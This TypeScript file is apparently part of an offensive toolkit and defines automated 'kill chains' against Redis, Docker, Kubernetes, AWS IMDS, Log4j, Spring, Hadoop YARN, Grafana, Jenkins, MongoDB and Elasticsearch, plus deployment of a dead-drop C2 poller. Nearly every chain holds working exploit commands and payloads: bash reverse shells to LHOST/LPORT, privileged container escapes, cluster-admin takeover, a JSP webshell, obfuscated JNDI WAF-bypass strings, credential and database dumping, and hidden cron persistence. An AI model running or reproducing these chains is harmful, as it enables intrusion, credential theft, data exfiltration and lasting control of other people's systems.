export interface ChainStep {
  id:          string;
  name:        string;
  type:        "http_probe" | "inject" | "port_exploit" | "payload_fire" | "custom" | "info";
  url?:        string;
  target?:     string;
  port?:       number;
  method?:     string;
  payload?:    string;
  successIf?:  string;
  failAction?: "abort" | "continue" | "escalate";
  timeout?:    number;
  cmd?:        string;
}

export interface KillChain {
  id:          string;
  name:        string;
  description: string;
  category:    "infrastructure" | "cloud" | "container" | "supply-chain" | "ci-cd" | "lateral" | "c2";
  severity:    "critical" | "high" | "medium";
  steps:       ChainStep[];
}

export const KILL_CHAINS: KillChain[] = [
  {
    id: "redis_rce_persist",
    name: "Redis → RCE + Host Persistence",
    description: "Unauthenticated Redis → CONFIG SET to write cron job → persistent root reverse shell",
    category: "infrastructure",
    severity: "critical",
    steps: [
      { id:"s1", name:"Probe Redis 6379", type:"port_exploit", target:"TARGET", port:6379, failAction:"abort" },
      { id:"s2", name:"Verify no-auth (INFO)", type:"custom",
        cmd:`echo -e "*1\r\n\$4\r\nINFO\r\n" | nc -w3 TARGET 6379 | head -3`, failAction:"continue" },
      { id:"s3", name:"CONFIG SET dir /var/spool/cron/crontabs", type:"custom",
        cmd:`echo -e "*4\r\n\$6\r\nCONFIG\r\n\$3\r\nSET\r\n\$3\r\ndir\r\n\$26\r\n/var/spool/cron/crontabs\r\n" | nc -w3 TARGET 6379`, failAction:"escalate" },
      { id:"s4", name:"CONFIG SET dbfilename root", type:"custom",
        cmd:`echo -e "*4\r\n\$6\r\nCONFIG\r\n\$3\r\nSET\r\n\$10\r\ndbfilename\r\n\$4\r\nroot\r\n" | nc -w3 TARGET 6379`, failAction:"continue" },
      { id:"s5", name:"SET cron rev-shell payload", type:"custom",
        cmd:`echo -e "*3\r\n\$3\r\nSET\r\n\$3\r\nnx1\r\n\$57\r\n\n* * * * * bash -i >& /dev/tcp/LHOST/LPORT 0>&1\n\n\r\n" | nc -w3 TARGET 6379`, failAction:"continue" },
      { id:"s6", name:"BGSAVE (flush cron to disk)", type:"custom",
        cmd:`echo -e "*1\r\n\$6\r\nBGSAVE\r\n" | nc -w3 TARGET 6379`, failAction:"continue" },
      { id:"s7", name:"Wait for cron fire (start nc listener)", type:"info",
        cmd:`echo "Cron fires in <60s. Run: nc -lvnp LPORT"`, failAction:"continue" },
    ],
  },
  {
    id: "docker_socket_escape",
    name: "Docker Socket → Host Persistence",
    description: "Exposed Docker API → privileged container with host mount → write root cron → persistent shell",
    category: "container",
    severity: "critical",
    steps: [
      { id:"s1", name:"Probe Docker API 2375", type:"port_exploit", target:"TARGET", port:2375, failAction:"abort" },
      { id:"s2", name:"List containers", type:"http_probe", url:"http://TARGET:2375/containers/json?all=true", method:"GET", successIf:"200", failAction:"abort" },
      { id:"s3", name:"Create privileged container (host mount)", type:"http_probe",
        url:"http://TARGET:2375/containers/create?name=nx_esc",
        method:"POST",
        payload:JSON.stringify({Image:"alpine",Cmd:["/bin/sh","-c","echo '* * * * * root bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> /host/etc/cron.d/nx"],HostConfig:{Binds:["/:/host"],Privileged:true}}),
        successIf:"201", failAction:"escalate" },
      { id:"s4", name:"Start container", type:"http_probe", url:"http://TARGET:2375/containers/nx_esc/start", method:"POST", payload:"", successIf:"204", failAction:"continue" },
      { id:"s5", name:"Wait 3s + cleanup", type:"custom",
        cmd:`sleep 3; curl -sk -X DELETE "http://TARGET:2375/containers/nx_esc?force=true" 2>/dev/null`, failAction:"continue" },
    ],
  },
  {
    id: "k8s_sa_takeover",
    name: "K8s SA Token → Cluster Admin + Escape Pod",
    description: "Pod SA token → RBAC recon → ClusterRoleBinding → privileged escape pod → host shell",
    category: "container",
    severity: "critical",
    steps: [
      { id:"s1", name:"Read SA token", type:"info", cmd:`cat /var/run/secrets/kubernetes.io/serviceaccount/token`, failAction:"abort" },
      { id:"s2", name:"Probe K8s API 6443", type:"port_exploit", target:"TARGET", port:6443, failAction:"abort" },
      { id:"s3", name:"GET /api/v1/namespaces (RBAC check)", type:"http_probe", url:"https://TARGET:6443/api/v1/namespaces", method:"GET", successIf:"200", failAction:"escalate" },
      { id:"s4", name:"GET /api/v1/secrets (dump)", type:"http_probe", url:"https://TARGET:6443/api/v1/secrets", method:"GET", successIf:"200", failAction:"continue" },
      { id:"s5", name:"Create ClusterRoleBinding (cluster-admin)", type:"http_probe",
        url:"https://TARGET:6443/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
        method:"POST",
        payload:JSON.stringify({apiVersion:"rbac.authorization.k8s.io/v1",kind:"ClusterRoleBinding",metadata:{name:"nx-admin"},roleRef:{apiGroup:"rbac.authorization.k8s.io",kind:"ClusterRole",name:"cluster-admin"},subjects:[{kind:"ServiceAccount",name:"default",namespace:"default"}]}),
        successIf:"201", failAction:"continue" },
      { id:"s6", name:"Create privileged escape pod", type:"http_probe",
        url:"https://TARGET:6443/api/v1/namespaces/default/pods",
        method:"POST",
        payload:JSON.stringify({apiVersion:"v1",kind:"Pod",metadata:{name:"nx-esc"},spec:{hostPID:true,hostNetwork:true,containers:[{name:"nx",image:"alpine",command:["/bin/sh","-c","nsenter --target 1 --mount --uts --ipc --net --pid -- bash -i >& /dev/tcp/LHOST/LPORT 0>&1"],securityContext:{privileged:true}}],restartPolicy:"Never"}}),
        successIf:"201", failAction:"continue" },
    ],
  },
  {
    id: "aws_imds_breach",
    name: "AWS IMDS v1+v2 → IAM Creds → S3/SSM Exfil",
    description: "Detect IMDS → try v2 token then v1 fallback → IAM role creds → S3 bucket enum → user-data secrets",
    category: "cloud",
    severity: "critical",
    steps: [
      { id:"s1", name:"Try IMDSv2 (token PUT)", type:"http_probe", url:"http://169.254.169.254/latest/api/token", method:"PUT", successIf:"200", failAction:"escalate" },
      { id:"s2", name:"Get IAM role name", type:"http_probe", url:"http://169.254.169.254/latest/meta-data/iam/security-credentials/", method:"GET", successIf:"200", failAction:"abort" },
      { id:"s3", name:"Fetch IAM credentials (AK+SK+Token)", type:"custom",
        cmd:`_R=$(curl -sk http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null); curl -sk "http://169.254.169.254/latest/meta-data/iam/security-credentials/$_R" 2>/dev/null`, failAction:"abort" },
      { id:"s4", name:"Get instance identity + account ID", type:"http_probe", url:"http://169.254.169.254/latest/dynamic/instance-identity/document", method:"GET", successIf:"200", failAction:"continue" },
      { id:"s5", name:"Get user-data (often contains secrets)", type:"http_probe", url:"http://169.254.169.254/latest/user-data", method:"GET", successIf:"200", failAction:"continue" },
      { id:"s6", name:"List S3 buckets via creds", type:"custom",
        cmd:`AWS_ACCESS_KEY_ID=$KEY AWS_SECRET_ACCESS_KEY=$SEC AWS_SESSION_TOKEN=$TOK python3 -c "import boto3; [print(b['Name']) for b in boto3.client('s3').list_buckets()['Buckets']]" 2>/dev/null`, failAction:"continue" },
    ],
  },
  {
    id: "log4shell_exploit",
    name: "Log4Shell (CVE-2021-44228) → JNDI LDAP RCE",
    description: "Probe log4j via JNDI LDAP injection in common headers → confirm OOB callback → RCE via LDAP redirect",
    category: "infrastructure",
    severity: "critical",
    steps: [
      { id:"s1", name:"Probe HTTP service", type:"http_probe", url:"http://TARGET:8080/", method:"GET", successIf:"200", failAction:"continue" },
      { id:"s2", name:"Test JNDI via User-Agent header", type:"inject",
        url:"http://TARGET:8080/", method:"GET",
        payload:`{"headers":{"User-Agent":"\${jndi:ldap://LHOST:LPORT/exploit}","X-Forwarded-For":"\${jndi:ldap://LHOST:LPORT/xfwd}","X-Api-Version":"\${jndi:ldap://LHOST:LPORT/xapi}"}}`,
        successIf:"200", failAction:"continue" },
      { id:"s3", name:"Obfuscated JNDI payload (WAF bypass)", type:"inject",
        url:"http://TARGET:8080/",method:"GET",
        payload:`{"headers":{"User-Agent":"\${j\${::-n}di:ldap://LHOST:LPORT/exploit}","X-Auth-Token":"\${jndi:\${lower:l}dap://LHOST:LPORT/tok}"}}`,
        successIf:"200", failAction:"continue" },
      { id:"s4", name:"JNDI via POST body (Spring apps)", type:"inject",
        url:"http://TARGET:8080/api/login", method:"POST",
        payload:`{"username":"\${jndi:ldap://LHOST:LPORT/login}","password":"nx"}`,
        successIf:"200", failAction:"continue" },
      { id:"s5", name:"Start LDAP redirector on LHOST:LPORT", type:"info",
        cmd:`echo "Run: python3 -m ldap3 server LHOST LPORT\nOr: marshalsec-all.jar LDAPRefServer http://LHOST:LPORT/#Exploit"`, failAction:"continue" },
    ],
  },
  {
    id: "spring4shell_rce",
    name: "Spring4Shell (CVE-2022-22965) → ClassLoader RCE",
    description: "Spring MVC DataBinder ClassLoader injection → write JSP webshell → arbitrary RCE",
    category: "infrastructure",
    severity: "critical",
    steps: [
      { id:"s1", name:"Probe Spring app", type:"http_probe", url:"http://TARGET:8080/", method:"GET", successIf:"200", failAction:"continue" },
      { id:"s2", name:"CVE-2022-22965 ClassLoader exploit", type:"inject",
        url:"http://TARGET:8080/",method:"POST",
        payload:`class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b%2C%200%2C%20a))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=nx&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=`,
        successIf:"200", failAction:"continue" },
      { id:"s3", name:"Trigger written webshell", type:"http_probe",
        url:"http://TARGET:8080/nx.jsp?pwd=j&cmd=id", method:"GET", successIf:"200", failAction:"continue" },
      { id:"s4", name:"Execute reverse shell via webshell", type:"http_probe",
        url:"http://TARGET:8080/nx.jsp?pwd=j&cmd=bash+-c+%27bash+-i+>%26+/dev/tcp/LHOST/LPORT+0>%261%27", method:"GET", successIf:"200", failAction:"continue" },
    ],
  },
  {
    id: "mongodb_unauth_exfil",
    name: "MongoDB Unauthenticated → Collection Dump",
    description: "No-auth MongoDB → list databases → dump collections → exfil sensitive data",
    category: "infrastructure",
    severity: "critical",
    steps: [
      { id:"s1", name:"Probe MongoDB 27017", type:"port_exploit", target:"TARGET", port:27017, failAction:"abort" },
      { id:"s2", name:"Verify no-auth (isMaster command)", type:"custom",
        cmd:`echo -e '\x3a\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00\x00\x00\x00\x00admin.$cmd\x00\x00\x00\x00\x00\x01\x00\x00\x00\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00' | nc -w3 TARGET 27017 | strings | head -5 2>/dev/null`, failAction:"abort" },
      { id:"s3", name:"List databases (mongoexport)", type:"custom",
        cmd:`mongo --host TARGET --eval "db.adminCommand({listDatabases:1})" --quiet 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);[print(x['name']) for x in d['databases']]" 2>/dev/null`, failAction:"continue" },
      { id:"s4", name:"Dump admin + users collections", type:"custom",
        cmd:`mongoexport --host TARGET --db admin --collection system.users --quiet 2>/dev/null | head -20`, failAction:"continue" },
      { id:"s5", name:"Full DB dump (most likely targets)", type:"custom",
        cmd:`for db in admin userdb accounts data credentials; do mongoexport --host TARGET --db $db --collection users --quiet 2>/dev/null | head -5; done`, failAction:"continue" },
    ],
  },
  {
    id: "hadoop_yarn_rce",
    name: "Hadoop YARN REST API → Unauthenticated RCE",
    description: "YARN ResourceManager API → submit malicious application → execute reverse shell",
    category: "infrastructure",
    severity: "critical",
    steps: [
      { id:"s1", name:"Probe YARN ResourceManager 8088", type:"port_exploit", target:"TARGET", port:8088, failAction:"abort" },
      { id:"s2", name:"Get YARN cluster info", type:"http_probe", url:"http://TARGET:8088/ws/v1/cluster/info", method:"GET", successIf:"200", failAction:"abort" },
      { id:"s3", name:"Submit malicious YARN application", type:"http_probe",
        url:"http://TARGET:8088/ws/v1/cluster/apps/new-application", method:"POST", payload:"", successIf:"200", failAction:"abort" },
      { id:"s4", name:"Fire reverse shell via YARN app", type:"custom",
        cmd:`curl -sk -X POST "http://TARGET:8088/ws/v1/cluster/apps" -H "Content-Type: application/xml" -d '<application-submission-context><application-name>nx</application-name><queue>default</queue><priority>0</priority><unmanaged-AM>false</unmanaged-AM><max-app-attempts>1</max-app-attempts><resource><memory>1024</memory><vCores>1</vCores></resource><application-type>YARN</application-type><am-container-spec><commands><command>bash -i &gt;&amp; /dev/tcp/LHOST/LPORT 0&gt;&amp;1</command></commands></am-container-spec></application-submission-context>' 2>/dev/null`, failAction:"continue" },
    ],
  },
  {
    id: "grafana_full_breach",
    name: "Grafana CVE-2021-43798 + Datasource Cred Dump",
    description: "Grafana path traversal → read grafana.db → extract datasource credentials → pivot to databases",
    category: "infrastructure",
    severity: "critical",
    steps: [
      { id:"s1", name:"Probe Grafana 3000", type:"port_exploit", target:"TARGET", port:3000, failAction:"abort" },
      { id:"s2", name:"CVE-2021-43798 path traversal /etc/passwd", type:"http_probe",
        url:"http://TARGET:3000/public/plugins/alertlist/../../../../../../../etc/passwd", method:"GET", successIf:"200", failAction:"continue" },
      { id:"s3", name:"Read grafana.db (contains datasource creds)", type:"http_probe",
        url:"http://TARGET:3000/public/plugins/alertlist/../../../../../../../var/lib/grafana/grafana.db", method:"GET", successIf:"200", failAction:"continue" },
      { id:"s4", name:"Try default admin:admin credentials", type:"http_probe",
        url:"http://TARGET:3000/api/datasources", method:"GET", successIf:"200", failAction:"continue" },
      { id:"s5", name:"Dump datasource passwords", type:"http_probe",
        url:"http://TARGET:3000/api/datasources/proxy/1/query?db=_internal&q=SHOW+DATABASES", method:"GET", successIf:"200", failAction:"continue" },
    ],
  },
  {
    id: "jenkins_groovy_rce",
    name: "Jenkins Unauth → Groovy RCE → Network Pivot",
    description: "Jenkins unauthenticated API → CVE-2024-23897 file read → Script Console RCE → lateral movement",
    category: "ci-cd",
    severity: "critical",
    steps: [
      { id:"s1", name:"Probe Jenkins 8080", type:"port_exploit", target:"TARGET", port:8080, failAction:"abort" },
      { id:"s2", name:"Enumerate Jenkins API", type:"http_probe", url:"http://TARGET:8080/api/json?depth=1", method:"GET", successIf:"200", failAction:"abort" },
      { id:"s3", name:"CVE-2024-23897 CLI file read /etc/passwd", type:"custom",
        cmd:`curl -sk "http://TARGET:8080/cli?remoting=false" -H "Content-Type: application/x-www-form-urlencoded" --data 'command=help+@/etc/passwd' 2>/dev/null | head -10`, failAction:"continue" },
      { id:"s4", name:"Check Script Console access", type:"http_probe", url:"http://TARGET:8080/script", method:"GET", successIf:"200", failAction:"continue" },
      { id:"s5", name:"Groovy RCE: id + hostname + uname", type:"custom",
        cmd:`curl -sk -u admin:admin -X POST "http://TARGET:8080/scriptText" --data-urlencode 'script=def cmd=["id","hostname","uname -a"].collect{["bash","-c",it].execute().text};println cmd.join("\\n")' 2>/dev/null`, failAction:"continue" },
      { id:"s6", name:"Groovy reverse shell", type:"custom",
        cmd:`curl -sk -u admin:admin -X POST "http://TARGET:8080/scriptText" --data-urlencode 'script=["bash","-c","bash -i >& /dev/tcp/LHOST/LPORT 0>&1"].execute()' 2>/dev/null`, failAction:"continue" },
    ],
  },
  {
    id: "elastic_data_breach",
    name: "Elasticsearch Unauthenticated → Data Exfil",
    description: "Unauthenticated ES → list indices → dump sensitive documents → search for creds",
    category: "infrastructure",
    severity: "critical",
    steps: [
      { id:"s1", name:"Probe ES 9200", type:"port_exploit", target:"TARGET", port:9200, failAction:"abort" },
      { id:"s2", name:"Cluster health + version", type:"http_probe", url:"http://TARGET:9200/", method:"GET", successIf:"200", failAction:"abort" },
      { id:"s3", name:"List indices (sorted by size)", type:"http_probe", url:"http://TARGET:9200/_cat/indices?v&s=docs.count:desc", method:"GET", successIf:"200", failAction:"abort" },
      { id:"s4", name:"Dump 50 docs from largest index", type:"custom",
        cmd:`curl -sk "http://TARGET:9200/_search?size=50" -H 'Content-Type: application/json' -d '{"query":{"match_all":{}},"sort":[{"_score":"desc"}]}' 2>/dev/null | python3 -c "import sys,json;docs=json.load(sys.stdin)['hits']['hits'];[print(json.dumps(d['_source'])[:200]) for d in docs[:10]]" 2>/dev/null`, failAction:"continue" },
      { id:"s5", name:"Search for password/key fields", type:"http_probe",
        url:"http://TARGET:9200/_search",
        method:"POST",
        payload:JSON.stringify({query:{multi_match:{query:"password secret token api_key credential",fields:["*"]}},size:20}),
        successIf:"200", failAction:"continue" },
    ],
  },
  {
    id: "dead_drop_c2_deploy",
    name: "Deploy Dead-Drop C2 Poller to Compromised Host",
    description: "Use existing foothold (RCE/SSH) to deploy a GitHub Gist / Pastebin C2 poller with persistence",
    category: "c2",
    severity: "high",
    steps: [
      { id:"s1", name:"Verify RCE foothold (id command)", type:"custom",
        cmd:`curl -sk "http://TARGET/rce?cmd=id" 2>/dev/null || ssh -o StrictHostKeyChecking=no user@TARGET 'id' 2>/dev/null`, failAction:"abort" },
      { id:"s2", name:"Check Python3 availability", type:"custom",
        cmd:`curl -sk "http://TARGET/rce?cmd=which+python3" 2>/dev/null || ssh user@TARGET 'which python3' 2>/dev/null`, failAction:"escalate" },
      { id:"s3", name:"Deploy bash poller (base64 encoded)", type:"custom",
        cmd:`# Generate poller payload first via /api/weapons/c2\n# Then deploy via foothold:\necho 'BASE64_ENCODED_POLLER' | base64 -d | bash &`, failAction:"continue" },
      { id:"s4", name:"Persist via cron", type:"custom",
        cmd:`F=/tmp/.$(head -c4 /dev/urandom|xxd -p||echo nx); echo POLLER_PAYLOAD|base64 -d>$F; chmod +x $F; (crontab -l 2>/dev/null; echo "@reboot $F") | crontab - 2>/dev/null`, failAction:"continue" },
      { id:"s5", name:"Verify poller running", type:"custom",
        cmd:`ps aux 2>/dev/null | grep -v grep | grep -iE 'bash|python3|kworker' | head -5`, failAction:"continue" },
      { id:"s6", name:"Post first command to dead-drop", type:"info",
        cmd:`# Encode and post command to dead-drop URL:\n# python3 -c "import base64; cmd='id && hostname'; enc=base64.b64encode(bytes(b^0x4e for b in cmd.encode())).decode(); print(enc)"`, failAction:"continue" },
    ],
  },
];

export function getKillChain(id: string): KillChain | undefined {
  return KILL_CHAINS.find(c => c.id === id);
}
